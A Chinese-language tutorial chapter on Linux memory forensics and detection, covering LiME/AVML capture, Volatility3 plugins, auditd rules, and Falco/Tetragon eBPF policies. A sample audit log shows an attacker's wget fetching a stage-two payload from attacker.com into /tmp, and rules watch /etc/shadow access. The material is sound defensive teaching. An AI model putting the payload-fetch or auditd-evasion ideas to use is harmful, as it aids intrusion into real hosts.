# Ch 22 — Linux 記憶體鑑識 + auditd/eBPF 偵測

> **目標：** 學會用 LiME/AVML 擷取 Linux 記憶體，用 Volatility3 從記憶體裡還原進程、偵測 syscall table hook；同時設計 auditd 規則抓 execve 與敏感檔案存取，並理解為什麼 eBPF（Falco/Tetragon）在偵測能力上超越 auditd。
> **環境：** Ubuntu 22.04 LTS，Volatility3，auditd（`apt install auditd`）；LiME 需要對應 kernel 的 DKMS 或手動編譯。Volatility 的輸出為示意，因為沒有真實惡意進程，以概念示範為主，標（示意，依環境而異）。

---

## 為什麼需要記憶體鑑識？

你在攻擊課學過把 shellcode 直接注入到進程記憶體（process injection）、把 payload 放在 `[heap]` 或匿名 mmap，接著刪掉磁碟上的二進位檔。這些技術的設計目標就是讓磁碟鑑識看不到它——但記憶體不說謊。

記憶體裡保存了：
- 已刪除但仍在跑的 ELF binary 的完整代碼段
- 注入的 shellcode（通常在可執行的匿名映射區段）
- 明文的加密金鑰、C2 配置、憑證
- 被 rootkit hook 過的 syscall table（原本的指標還在堆疊上）
- 所有進程的 kernel stack、file descriptor table

磁碟鑑識補不了的，記憶體說得清清楚楚。

---

## 先建立直覺：Linux 記憶體擷取的挑戰

Windows 有 WinPmem，Linux 的情況麻煩一點：

1. **沒有統一的 kernel API 可以 dump 整個實體記憶體**（Windows 的 `\Device\PhysicalMemory` 在 Linux 沒有對等物）
2. **需要 kernel 模組**：LiME（Linux Memory Extractor）是一個 LKM，載入後才能讀取記憶體
3. **KASLR**（Kernel Address Space Layout Randomization）讓 symbol 位址每次開機都不同，Volatility 需要對應的 symbol table 才能解析
4. **即時性問題**：記憶體在 dump 的過程中繼續變動（記憶體一致性問題），這不可避免

---

## 記憶體擷取：LiME 與 AVML

### LiME（Linux Memory Extractor）

LiME 是 GitHub 上的開源 LKM（`github.com/504ensicsLabs/LiME`），需要編譯成對應 kernel 版本的 `.ko`。

```bash
# 事前準備（在乾淨機器上預編譯，帶到現場）
git clone https://github.com/504ensicsLabs/LiME
cd LiME/src
make                  # 需要 linux-headers-$(uname -r)
# 產出：lime-$(uname -r).ko

# 現場使用：載入 LiME，把記憶體輸出到外部 USB（掛載在 /mnt/evidence）
# format=lime 是 Volatility 支援的格式
insmod lime-6.5.0-45-generic.ko "path=/mnt/evidence/memory.lime format=lime"

# 也可以直接透過網路傳（不寫本地磁碟）
insmod lime-6.5.0-45-generic.ko "path=tcp:4444 format=lime"
# 接收端：nc -l -p 4444 > memory.lime
```

### AVML（Acquire Volatile Memory for Linux）

Microsoft 開源的工具（`github.com/microsoft/avml`），單一靜態 binary，不需要 kernel 模組，改從 `/dev/mem` 或 `/proc/kcore` 讀取：

```bash
# 直接跑，輸出 LiME 格式
./avml /mnt/evidence/memory.lime

# 優點：不需要 insmod，降低現場風險
# 缺點：/proc/kcore 可能被 CONFIG_STRICT_DEVMEM 限制存取，某些 kernel 只能讀前 1MB
```

實務上 LiME 的可靠性更高，但需要事前準備 `.ko`。AVML 是臨時應急的選擇。

---

## Volatility3：Linux 分析的前置條件

Volatility3 解析 Linux 記憶體的前提是有對應 kernel 的 **ISF（Intermediate Symbol Format）** 符號表，Volatility 稱之為 **symbol table**。

### 取得 ISF

```bash
# 方法一：dwarf2json 從 kernel debug symbols 產生
# 需要 linux-image-$(uname -r)-dbgsym 套件
apt install linux-image-$(uname -r)-dbgsym
dwarf2json linux --elf /usr/lib/debug/boot/vmlinux-$(uname -r) > /opt/volatility3/volatility3/symbols/linux/ubuntu22.04.json.xz

# 方法二：從 Volatility 官方或社群的預建表格庫下載
# https://github.com/Abyss-W4tcher/volatility3-symbols（社群整理）
```

沒有正確的 ISF，Volatility 的所有 Linux plugin 都不能用。這是最常見的踩坑點。

---

## Volatility3 Linux Plugin 實戰

### linux.pslist：進程清單

```bash
python3 vol.py -f memory.lime linux.pslist

# 輸出欄位（示意，依環境而異）：
# PID    PPID   COMM         Offset(V)         File output
# 1      0      systemd      0xffff9e3a8c240000
# 2      0      kthreadd     0xffff9e3a8c241800
# ...
# 3847   1234   bash         0xffff9e3b1d340000
# 3901   3847   (deleted)    0xffff9e3b2a100000   /tmp/.x11-unix/proc
```

關鍵：Volatility 遍歷的是 kernel 的 `task_struct` 鏈，rootkit 如果只 hook 了 `/proc` 的介面，這裡仍然能看到被隱藏的 PID。

### linux.malfind：找可疑的可執行記憶體區域

這個 plugin 的邏輯跟 Windows 的 malfind 類似：找那些被 mmap 為可執行（rwxp 或 r-xp）但沒有對應檔案映射（path 為空）的匿名記憶體區域，這是注入 shellcode 的典型特徵。

```bash
python3 vol.py -f memory.lime linux.malfind

# 輸出（示意）：
# PID     Process    Start              End                VMA Flags  File path
# 3847    bash       0x7f3a1b000000     0x7f3a1b001000     rwxp       (anonymous)
#
# 0x7f3a1b000000  e9 42 00 00 00 48 89 e5 ...   # 這段反組譯看起來像 shellcode
```

### linux.check_syscall：偵測 syscall table hook

LKM rootkit 最愛改 syscall table 裡的函數指標（把 `sys_getdents64` 替換成自己的 hook 讓 `ls` 看不到特定檔案）。這個 plugin 把記憶體裡的 syscall table 指標拿出來，跟 ISF 符號表比對，不在 kernel 模組正常範圍內的指標就是 hook。

```bash
python3 vol.py -f memory.lime linux.check_syscall

# 正常輸出：所有指標都指向 kernel text segment（.text 或 .init.text）
# 有問題的輸出（示意）：
# Table    Index  Handler              Symbol
# sys_call_table  78  0xffffffffc0a01040   HOOKED (points outside kernel text)
# 78 對應的是 __NR_getdents64（依 kernel 版本）
```

### linux.lsmod：列出 kernel module

```bash
python3 vol.py -f memory.lime linux.lsmod

# rootkit 可能把自己從 lsmod 清單刪掉（修改 module list linked list）
# Volatility 從記憶體直接掃 module 的 magic bytes，可以找到隱藏的 module
```

---

## auditd：Linux 偵測遙測的地基

**auditd**（Linux Audit Daemon）是 kernel 層級的遙測機制，透過 `audit` subsystem 在 syscall 執行前後記錄事件，再由 auditd daemon 寫到 `/var/log/audit/audit.log`。

### 規則語法

```bash
# /etc/audit/rules.d/dfir.rules

# 1. 記錄所有 execve（命令執行）
-a always,exit -F arch=b64 -S execve -k exec_log
-a always,exit -F arch=b32 -S execve -k exec_log

# 2. 記錄 /etc/passwd 和 /etc/shadow 的存取（credential dumping 偵測）
-w /etc/passwd -p rwxa -k passwd_access
-w /etc/shadow -p rwxa -k shadow_access

# 3. 記錄 /etc/ld.so.preload 的變更（LD_PRELOAD rootkit）
-w /etc/ld.so.preload -p wa -k ld_preload_change

# 4. 記錄 /tmp 和 /dev/shm 的可執行檔建立（dropper 偵測）
-w /tmp -p wx -k tmp_exec
-w /dev/shm -p wx -k devshm_exec

# 5. 記錄 ptrace（注入、anti-debug 相關）
-a always,exit -F arch=b64 -S ptrace -k ptrace_use

# 6. 記錄 insmod/rmmod（LKM 操作）
-w /sbin/insmod -p x -k module_load
-w /sbin/rmmod -p x -k module_unload
-a always,exit -F arch=b64 -S init_module -S finit_module -k module_load_syscall

# 7. 記錄 cron 目錄的異動
-w /etc/cron.d -p wa -k cron_change
-w /var/spool/cron -p wa -k cron_change
```

載入規則：

```bash
augenrules --load
systemctl restart auditd
auditctl -l    # 確認規則生效
```

### ausearch 與 aureport

```bash
# 查詢特定 key 的所有事件
ausearch -k shadow_access --start today

# 查詢特定進程的所有 execve
ausearch -k exec_log -p 3847

# 輸出格式（示意）：
# ----
# time->Fri Aug  1 03:12:44 2026
# type=SYSCALL msg=audit(1754019164.183:1234): arch=c000003e syscall=59
#   success=yes exit=0 a0=5621a1234 a1=7ffcb1234 a2=7ffcb5678 a3=8
#   items=2 ppid=3001 pid=3847 auid=1000 uid=0 gid=0 euid=0 ...
#   comm="wget" exe="/usr/bin/wget" key="exec_log"
# type=EXECVE msg=audit(...):  argc=3 a0="wget" a1="http://attacker.com/stage2" a2="-O" a3="/tmp/.x"
# type=CWD msg=audit(...):  cwd="/root"
# type=PATH msg=audit(...):  item=0 name="/usr/bin/wget" inode=... objtype=NORMAL

# 統計報告
aureport -x --summary          # execve 統計
aureport -l --summary          # login 統計
aureport --failed              # 失敗事件摘要
```

### auditd 的侷限

auditd 有幾個結構性的問題：

1. **高負載**：對繁忙 server 開啟完整 execve 記錄可能造成顯著 CPU overhead（每個 execve 要進 kernel、寫 log ring buffer、wakeup auditd daemon）
2. **ring buffer overflow**：`/proc/sys/kernel/audit_backlog_limit` 預設是 8192 條，高 TPS 情況下可能丟事件
3. **user-space auditd daemon 可以被殺**：攻擊者 kill auditd 後可以減少 log 量（雖然 kernel audit subsystem 還在，但 daemon 死了就沒人寫檔案）
4. **不是即時偵測**：auditd 是「記錄然後分析」，不是「看到就阻斷」

---

## eBPF 偵測：為什麼比 auditd 更強？

你在 bpf 課學過 eBPF 的架構——kprobe/tracepoint/LSM hook，程式直接在 kernel 裡跑，效率遠高於 user-space daemon 的模型。這個特性在偵測上帶來的好處是：

| 面向 | auditd | eBPF（Falco/Tetragon） |
|------|--------|----------------------|
| Hook 點 | syscall audit hooks（固定） | kprobe/tracepoint/LSM（任意 kernel 函數） |
| 執行位置 | kernel ring buffer → user daemon | kernel 內部（verifier 確保安全） |
| 即時阻斷 | 不支援 | Tetragon 支援（`Action: SIGKILL`） |
| Overhead | 中—高（每事件要切 context） | 低—中（in-kernel 處理，只有感興趣的事件才送 user） |
| 規避難度 | 中（kill auditd、audit ring overflow） | 高（eBPF 程式在 kernel 裡，攻擊者難以繞過） |
| 靈活性 | 規則基於 syscall number + filter | 可 hook 任意 kernel symbol，讀 kernel struct |
| Structured output | 需要自己 parse | JSON（Falco）/ gRPC（Tetragon） |

### Falco 概念

**Falco**（CNCF 專案）是最廣泛使用的 eBPF/kprobe based runtime 安全工具。它有兩個 driver：舊的 kernel module driver 和新的 eBPF driver（推薦）。

規則格式（YAML）：

```yaml
- rule: Shell Spawned by Non-Shell Process
  desc: 偵測非預期進程產生 shell
  condition: >
    spawned_process and
    proc.name in (shell_binaries) and
    not proc.pname in (shell_binaries) and
    not proc.pname in (cron_binaries)
  output: >
    Shell spawned by suspicious parent
    (user=%user.name parent=%proc.pname command=%proc.cmdline
     container=%container.id)
  priority: WARNING
  tags: [shell, T1059.004]

- rule: Write to Sensitive Files
  desc: 偵測對 /etc/ld.so.preload 的寫入
  condition: >
    open_write and fd.name = /etc/ld.so.preload
  output: >
    Sensitive file written (user=%user.name command=%proc.cmdline file=%fd.name)
  priority: CRITICAL
  tags: [persistence, T1574.006]
```

### Tetragon 概念

**Tetragon**（Isovalent/Cilium 專案）走得更深：它可以掛在任意 kernel 函數上（不只是 syscall 邊界），並且支援 **即時阻斷**（在 kernel 裡直接送 SIGKILL 給違規進程，不需要繞回 user space）。

這對防守方是個重大升級：傳統的 auditd 只能「發現」，Tetragon 可以「預防」。

```yaml
# TracingPolicy 範例：阻斷從 /tmp 執行任何程式
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: block-tmp-exec
spec:
  kprobes:
  - call: "security_bprm_check"
    syscall: false
    args:
    - index: 0
      type: "linux_binprm"
    selectors:
    - matchBinaries:
      - operator: "Prefix"
        values:
        - "/tmp/"
      matchActions:
      - action: Sigkill
```

---

## 把三者整合到偵測流程

```
          ┌─────────────────────────────────────────┐
          │         執行時偵測（live）                │
          │                                         │
          │  auditd ──────────────────────────────> audit.log
          │  （記錄 execve、檔案存取、module 操作）     │
          │                                         │
          │  Falco ──────────────────────────────→ alert JSON
          │  （即時偵測可疑行為模式）                   │
          │                                         │
          │  Tetragon ──────────────────────────→  block + log
          │  （kernel 內即時阻斷 + 深度遙測）           │
          └─────────────────────────────────────────┘
                              │
                              ▼（事後鑑識）
          ┌─────────────────────────────────────────┐
          │         記憶體鑑識（offline）              │
          │                                         │
          │  LiME/AVML ──> memory.lime              │
          │  Volatility3 ──>                        │
          │    linux.pslist（被隱藏的 PID）           │
          │    linux.malfind（注入的 shellcode）      │
          │    linux.check_syscall（hook 偵測）       │
          └─────────────────────────────────────────┘
```

---

## 具體場景：偵測 LKM rootkit 的 syscall hook

攻擊者載入了一個 LKM，hook 了 `sys_getdents64` 讓 `ls` 看不到特定檔案。在 live 狀態下：

```bash
# 1. lsmod 看不到（rootkit 把自己從 module list 拿掉了）
lsmod | grep -v '^Module'   # 假設沒有可疑項目

# 2. 但 /proc/modules 可能也被 hook
# 改用 sysfs 繞過：
cat /sys/module/*/initstate 2>/dev/null | head -20

# 3. 最可靠：從 auditd 看 insmod/init_module 事件
ausearch -k module_load_syscall --start yesterday
# 如果有輸出，就能看到模組被載入的時間和執行者

# 4. 記憶體分析
python3 vol.py -f memory.lime linux.check_syscall | grep HOOKED
# 這一行如果有輸出，就確認了 hook

python3 vol.py -f memory.lime linux.lsmod
# 跟 lsmod 輸出比較，Volatility 可能看到 rootkit module
```

---

## 踩雷

1. **ISF 符號表必須精確對應 kernel 版本和 config**：Ubuntu 的 mainline kernel 和 HWE kernel（hardware enablement）是不同的，不能交換使用。最好的做法是在受害機器上跑 `uname -r` 確認版本，然後用同版本的 debug symbol 產生 ISF。

2. **LiME 的 `.ko` 需要跟受害機器的 kernel 完全一致**：版本、arch、kernel config（特別是 `CONFIG_RANDOMIZE_BASE`/KASLR 的設定）都必須相符。如果不符，insmod 會失敗，或者 dump 出來的記憶體損壞。最保險的做法是在與受害機器相同的 AMI/image 上編譯。

3. **auditd 的 execve 記錄是 multi-record 的**：一個 execve 事件會產生多條 log（`SYSCALL`、`EXECVE`、`CWD`、`PATH`），要用同一個 `msg` 欄位裡的 audit event ID 把它們關聯起來，否則解析出來的資訊不完整。

4. **eBPF 偵測不是萬能的**：攻擊者如果在 eBPF verifier 生效之前（例如 kernel 啟動非常早期）或者利用 eBPF 本身的漏洞，可以繞過。此外，某些 eBPF 程式載入時需要 `CAP_BPF` 或 root，攻擊者在得到 root 之後也能載入自己的 eBPF 程式干擾偵測。

5. **Volatility3 的 `linux.malfind` 有 false positive**：JIT 編譯器（Java、Node.js V8、Python 的某些 extension）會產生合法的可執行匿名記憶體。要搭配進程名稱和大小過濾，並反組譯前幾個位元組確認。

---

## 進階延伸

- **Volatility3 的 `linux.bash` plugin**：可以從記憶體裡讀出 bash 的 history buffer（就算 `HISTFILE=/dev/null`，bash 在記憶體裡還是有一份 history linked list），這是繞過 bash 反鑑識的利器。
- **Sysdig Inspect** + Falco 的組合：Sysdig 可以把系統呼叫的 scap（system capture）檔錄下來事後重播，類似 Wireshark 對網路的作用，對 Linux kernel 事件做離線分析。
- **Auditbeat**（Elastic）：把 auditd 事件直接送 Elasticsearch，比手動 parse audit.log 有更好的搜尋能力，適合 SIEM 整合。
- **eBPF LSM**（Linux Security Module via eBPF）：Linux 5.7+ 支援 `BPF_PROG_TYPE_LSM`，讓 eBPF 程式可以掛在 LSM hook 上做 mandatory access control，是比 SELinux/AppArmor 更靈活的防禦機制。

---

## 本章重點整理

- **記憶體擷取**：LiME（最可靠，需要對應 `.ko`）vs AVML（快速部署，靠 `/proc/kcore`，有限制）。
- **Volatility3** 需要精確的 ISF 符號表；`linux.pslist` 繞過 `/proc` hook，`linux.malfind` 找注入的匿名可執行段，`linux.check_syscall` 抓 syscall hook。
- **auditd** 是 kernel-native 的遙測，適合法律可接受的完整 audit trail；關鍵規則：execve、敏感檔案存取、insmod、ld.so.preload 異動。
- **eBPF（Falco/Tetragon）** 比 auditd 彈性高，overhead 低，Tetragon 還能即時阻斷；但需要較新的 kernel 且攻擊者有 root 後也有辦法干擾。
- 三者不是替代關係，是互補的：auditd 提供 audit trail、Falco 即時偵測、記憶體鑑識解剖事後的完整狀態。

## 自我檢核

1. 你有一份 `memory.lime`，但 `linux.pslist` 報錯 `No symbol table found`，最可能是什麼問題？
2. `linux.check_syscall` 找到一個指標指向 `0xffffffffc0a01040`，但 `cat /proc/kallsyms | grep 0xffffffffc0a01040` 沒有結果，這代表什麼？
3. auditd 的 `EXECVE` 記錄為什麼會拆成多條 message，而不是一條？（提示：核心是 audit event size 限制）
4. 攻擊者可以怎麼讓 auditd 停止記錄 execve，但又不 kill auditd daemon？
5. Falco 的 `spawned_process` macro 和 auditd 的 `execve` 記錄，偵測範圍有什麼不同？（提示：想想 `fork()+exec()` vs 只有 `fork()` 的場景）

## 延伸閱讀

1. **SANS FOR577（Google Cloud Platform Forensics）** — 雖然是雲端課，但其中 Linux 記憶體鑑識的章節（特別是 LiME + Volatility 工作流）是目前公開課程中講得最實用的。
2. **[Volatility3 Linux plugin 文件](https://volatility3.readthedocs.io/en/latest/volatility3.plugins.linux.html)** — 每個 plugin 的參數與輸出格式；`linux.check_idt`、`linux.check_modules`、`linux.envars` 都值得讀。
3. **[Falco 官方文件 — Rule writing guide](https://falco.org/docs/rules/)** — 條件語法、macro 庫（`spawned_process`、`open_write` 的定義）、output 欄位；自己寫規則之前必讀。
4. **[Tetragon — Getting Started](https://tetragon.io/docs/)** — TracingPolicy 的 kprobe 語法和 action；理解 in-kernel 阻斷的工作機制，與本課 bpf 章節互補。
5. **《The Art of Memory Forensics》Ch 14-16**（Ligh et al.，Wiley 2014）— Linux 記憶體鑑識的深度原典；task_struct 結構解析、rootkit 偵測原理，Volatility 的設計思路全在裡面。

---

→ [Ch 23 Linux 檔案系統鑑識與 rootkit 偵測](./23-linux-filesystem-rootkit.md)
